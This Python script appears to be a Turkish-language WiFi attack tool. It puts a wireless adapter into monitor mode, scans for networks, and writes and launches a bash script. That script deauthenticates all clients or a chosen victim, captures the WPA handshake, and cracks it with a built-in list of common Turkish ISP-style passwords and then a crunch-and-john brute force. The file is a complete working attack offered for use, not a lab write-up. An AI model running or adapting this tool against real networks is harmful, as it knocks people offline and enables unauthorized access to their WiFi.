#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import signal
import itertools
from time import sleep

RESET      = "\033[0m"
RED        = "\033[1;91m"
GREEN      = "\033[1;32m"
BOLD       = "\033[1m"
YELLOW     = "\033[1;33m"
WHITE_BOLD = "\033[1;37m"
GREEN_BOLD = "\033[1;32m"
MENU_WHITE = "\033[1;37m"

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def loading_animation():
    os.system("clear")
    spinner = itertools.cycle(["|", "/", "-", "\\"])
    print(f"{MENU_WHITE}Sistem aciliyor ", end="", flush=True)
    for _ in range(20):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.15)
        sys.stdout.write("\b")
    print(f" {GREEN}Hosgeldiniz{RESET}\n")
    sleep(1)
    os.system("clear")

BANNER = RED + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠤⠤⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡼⠟⠓⠒⠂⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠀⠀⣐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠖⠋⠁⠀⠀⠀⠀⠀⢀⠔⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⡅⠀⠀⠀⠀⢠⡁⠀⠀⠀⠀⠀⣠⣶⡼⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣏⡀⠀⠀⠀⠘⠀⠀⠀⠀⠀⣦⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⢌⠁⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠊⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⡀⠀⠀⠀⠀⣿⠀⠀⠎⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⢀⣠⣧⣤⠤⠤⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠈⠻⣦⠀⠀⠀⢸⣧⠀⠁⠀⠀   ⢀⣿⠀⠀⠀⠀⣀⣤⡶⠚⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠘⣻⢀⠄⠀⠀⠀⢸⠇⢐⣆⡾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠔⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⣄⣾⠶⢆⣀⣀⣀⣿⣦⣤⣿⣟⣖⣜⣅⣰⢏⣠⢟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠤⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢇⠜⠉⠒⣿⣿⡿⠟⢻⣿⣿⣿⣿⣿⣿⣜⣵⠟⠁⠀⠀⠀⠀⠀⠀⢀⠠⠠⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡪⠁⠀⠀⠀⣰⣿⣃⣤⣤⣾⣿⣿⣿⡿⢿⣿⣿⢿⠆⠀⠀⠀⠀⠀⠛⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⢿⢳⣿⣿⠁⠈⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡏⣦⣿⡿⠁⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⣿⠟⢁⠀⠀⠀⠀⠀⠈⠣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⢿⣿⡟⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣻⠁⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠔⠁⠀⠀⠀⠀⠀⠀⠀⢠⠗⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


 ____  _____        _      ______            _        __                
|_   \|_   _|      / |_  .' ____ \          (_)      |  ]               
  |   \ | |  .---.`| |-' | (___ \_|_ .--.   __   .--.| | .---.  _ .--.  
  | |\ \| | / /__\\| |    _.____`.[ '/'`\ \[  |/ /'`\' |/ /__\\[ `/'`\] 
 _| |_\   |_| \__.,| |,  | \____) || \__/ | | || \__/  || \__., | |     
|_____|\____|'.__.'\__/   \______.'| ;.__/ [___]'.__.;__]'.__.'[___]    
                                  [__|                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

— The web is vast, but every thread can be traced.

""" + RESET

def run_cmd(cmd, block=True):
    if block:
        return subprocess.run(cmd, shell=True)
    else:
        return subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)

def stop_process(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except:
        pass

def force_cleanup():
    print(RED + "\n[!] ACIL TEMIZLIK: Arka plan islemleri sonlandiriliyor..." + RESET)
    try:
        subprocess.run("killall airodump-ng aireplay-ng aircrack-ng 2>/dev/null", shell=True)
        subprocess.run("airmon-ng stop wlan0 > /dev/null 2>&1", shell=True)
        subprocess.run("service network-manager restart", shell=True) 
    except Exception as e:
        print(f"[-] Temizlik sirasinda hata: {e}")
    print(GREEN + "[+] Sistem temizlendi." + RESET)

def scan_networks():
    print(BOLD + "[*] WiFi aglari taraniyor..." + RESET)
    print(YELLOW + "[!] Taramayi durdurmak ve hedef secmek icin ENTER tusuna basin." + RESET)
    
    proc = run_cmd("airodump-ng wlan0", block=False)
    
    try:
        input() 
    except KeyboardInterrupt:
        pass

    stop_process(proc)
    print(YELLOW + "\n[*] Tarama durduruldu. Hedef secimine geciliyor..." + RESET)
    time.sleep(1)


def launch_attack_terminal(BSSID, CH, CAPNAME):
    custom_passwords = """12345678
123456789
1234567890
11111111
00000000
87654321
password
password1
password123
internet
internet123
wifi12345
wifi123456
wifi12345678
wireless
wireless123
evinternet
evinternet1
evinternet123
modem1234
modem12345
modem123456
turktelekom
turktelekom1
turktelekom123
ttnet1234
ttnet12345
superonline
superonline1
superonline123
vodafone
vodafone1
vodafone123
vodafone1234
homewifi
homewifi1
homewifi123
mywifi123
myinternet
myinternet123
net123456
netinternet
netinternet123
familywifi
family123
wifiinternet
wifiinternet123
qwertyui
qwertyuiop
asdfghjk
asdfghjkl
zxcvbnm1
zxcvbnm12
zxcvbnm123
abc12345
abc123456
abc12345678
iloveyou
iloveyou1
iloveyou123
welcome1
welcome123
welcomehome
administrator
letmein123
changeme1
changeme123
Admin
admin
1234
12345"""

    script_content = f"""#!/usr/bin/env bash
echo "Hedef BSSID: {BSSID}"

echo -e "\\n[?] SALDIRI TURU SECIN:"
echo "1) Tum agi kesme"
echo "2) Kurbani kes"
read -p "Secim (1/2): " CHOICE

TARGET_MAC=""
if [ "$CHOICE" == "2" ]; then
    echo "Kurbanin mac adresi:"
    read TARGET_MAC
fi

echo -e "\\n[*] Islemler basliyor..."

for i in {{1..3}}; do
    echo -e "\\n[*] Deneme $i/3: Deauth gonderiliyor..."
    
    if [ "$CHOICE" == "2" ] && [ ! -z "$TARGET_MAC" ]; then
        aireplay-ng --deauth 10 -D -a {BSSID} -c $TARGET_MAC wlan0
    else
        aireplay-ng --deauth 10 -D -a {BSSID} wlan0
    fi
    
    echo "[*] Paketler gonderildi. Kurbanin tekrar baglanmasi bekleniyor (10sn)..."
    sleep 10
    
    CAPFILE="{CAPNAME}-01.cap"
    if aircrack-ng "$CAPFILE" 2>&1 | grep -q "1 handshake"; then
        echo -e "\\033[1;32m[+] HANDSHAKE YAKALANDI!\\033[0m"
        break
    else
        echo -e "\\033[1;33m[-] Handshake bos, tekrar deneniyor...\\033[0m"
    fi
done

if aircrack-ng "$CAPFILE" 2>&1 | grep -q "1 handshake"; then
    echo -e "\\n[?] Sifre Kirma baslasin mi (e/h)"
    read DO_CRACK
    
    if [ "$DO_CRACK" == "e" ]; then
        
        echo -e "\\n\\033[1;34m[*] Once yaygin ozel sifreler deneniyor...\\033[0m"
        
        echo "{custom_passwords}" > custom_pass.txt
        
        aircrack-ng -w custom_pass.txt -b {BSSID} "$CAPFILE" -l found_key.txt
        
        if [ -f "found_key.txt" ]; then
            echo -e "\\n\\033[1;32m[+] MUKEMMEL! Sifre ozel listede bulundu!\\033[0m"
            echo -e "\\033[1;32m[+] SIFRE: $(cat found_key.txt)\\033[0m"
            rm custom_pass.txt found_key.txt 2>/dev/null
            echo -e "\\n[*] Islem bitti. Cikmak icin ENTER."
            read
            exit 0
        else
            echo -e "\\033[1;31m[-] Ozel listede yok. Derin taramaya (Crunch) geciliyor...\\033[0m"
            rm custom_pass.txt 2>/dev/null
        fi

        SESSION_NAME="vessel_crack"
        
        print_resume_cmd() {{
            echo -e "\\n\\033[1;33m[!] Daha sonra devam etmek icin su satiri calistir:\\033[0m"
            echo -e "\\033[1;97mjohn --restore=$SESSION_NAME | aircrack-ng -w - -b {BSSID} \"$CAPFILE\"\\033[0m"
            echo -e "\\n"
        }}

        if [ -f "$SESSION_NAME.rec" ]; then
            echo -e "\\033[1;36m[!] Eski bir oturum bulundu! Kaldigi yerden devam edilsin mi? (e/h)\\033[0m"
            read RESUME
            if [ "$RESUME" == "e" ]; then
                echo "[*] Eski oturum yukleniyor..."
                print_resume_cmd
                john --restore=$SESSION_NAME | aircrack-ng -w - -b {BSSID} "$CAPFILE"
            else
                echo "[*] Eski oturum siliniyor, sifirdan baslaniyor..."
                rm "$SESSION_NAME.rec" 2>/dev/null
                print_resume_cmd
                crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | john --stdin --session=$SESSION_NAME --stdout | aircrack-ng -w - -b {BSSID} "$CAPFILE"
            fi
        else
            echo "[*] Yeni oturum baslatiliyor (Crunch + John + Aircrack)..."
            print_resume_cmd
            crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | john --stdin --session=$SESSION_NAME --stdout | aircrack-ng -w - -b {BSSID} "$CAPFILE"
        fi
    fi
else
    echo -e "\\033[1;31m[!] Handshake yakalanamadi. PMF korumali olabilir.\\033[0m"
fi

echo -e "\\n[*] Islem bitti. Cikmak icin ENTER basin."
read
"""
    script_path = "/tmp/vessel_attack_v2.sh"
    with open(script_path, "w") as f:
        f.write(script_content)
    os.chmod(script_path, 0o755)
    
    subprocess.Popen(["gnome-terminal", "--", script_path])
    
def main():
    loading_animation()
    print(BANNER)
    
    if os.getuid() != 0:
        print(RED + "[!] HATA: Root yetkisi (sudo) gereklidir." + RESET)
        sys.exit(1)

    print(BOLD + "[*] WiFi Adaptor (wlan0) kontrol ediliyor..." + RESET)
    check = subprocess.run("iwconfig wlan0 2>/dev/null", shell=True)
    if check.returncode != 0:
        print(RED + "[-] HATA: wlan0 adaptoru bulunamadi!" + RESET)
        sys.exit(1)
    
    print(GREEN + "[+] wlan0 bulundu. Monitor modu baslatiliyor..." + RESET)
    run_cmd("airmon-ng start wlan0")
    time.sleep(2)

    try:
        scan_networks()
    except Exception as e:
        print(RED + f"[-] Hata: {e}" + RESET)

    try:
        print(f"\n{WHITE_BOLD}--- HEDEF SECIMI ---{RESET}")
        BSSID   = input(BOLD + "Hedef BSSID (MAC): " + RESET)
        CH      = input(BOLD + "Kanal (CH): " + RESET)
        CAPNAME = input(BOLD + "Kayit Dosyasi Adi (orn: hedef_wifi): " + RESET)

        print(YELLOW + f"\n[*] {BSSID} dinleniyor... Kayit: {CAPNAME}" + RESET)
        airodump_proc = run_cmd(f"airodump-ng wlan0 --bssid {BSSID} --channel {CH} --write {CAPNAME}", block=False)
        
        launch_attack_terminal(BSSID, CH, CAPNAME)

        input(BOLD + "\n[!] Saldiri tamamlandiysa ve cikmak istiyorsaniz ENTER'a basin..." + RESET)
        
        stop_process(airodump_proc)

    except KeyboardInterrupt:
        pass

    force_cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        force_cleanup()
        sys.exit(0)
